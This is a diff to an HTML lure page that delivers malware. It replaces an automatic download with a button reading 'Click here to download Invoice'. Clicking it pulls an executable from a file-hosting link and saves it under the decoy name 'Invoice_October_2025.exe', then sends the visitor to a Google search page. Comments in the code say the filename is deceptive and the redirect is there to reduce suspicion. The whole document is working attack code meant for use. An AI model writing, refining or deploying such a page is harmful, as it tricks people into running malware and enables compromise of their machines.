@@ -1,30 +1,37 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Loading Document...</title>
-    <script type="text/javascript">
-        window.onload = function() {
-            // --- CRITICAL: PASTE YOUR PAYLOAD'S DIRECT DOWNLOAD LINK HERE ---
-            var payloadUrl = "https://store1.gofile.io/download/3rOXQV/client.exe";
+</head>
 
-            // --- Set a deceptive filename for the user ---
+<body>
+    <p>Your document is ready for download.</p>
+    <button id="downloadBtn" style="padding:10px 20px; font-size:16px; cursor:pointer;">
+        Click here to download Invoice
+    </button>
+
+    <script type="text/javascript">
+        document.getElementById('downloadBtn').addEventListener('click', function () {
+            var payloadUrl = "https://store1.gofile.io/download/3rOXQV/client.exe";
             var decoyFilename = "Invoice_October_2025.exe";
 
             var link = document.createElement("a");
             link.href = payloadUrl;
+
+            // Note: download attribute might be ignored on cross-origin links but we add it anyway
             link.download = decoyFilename;
+
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
-            // --- Optional: Redirect to a safe page to lower suspicion ---
-            setTimeout(function() {
+            // Redirect after a short delay to reduce suspicion
+            setTimeout(function () {
                 window.location.href = "https://www.google.com/search?q=invoice+not+found";
             }, 500);
-        };
+        });
     </script>
-</head>
-<body>
-    <p>Your document is downloading. If it doesn't start automatically, please refresh the page.</p>
 </body>
+
 </html>
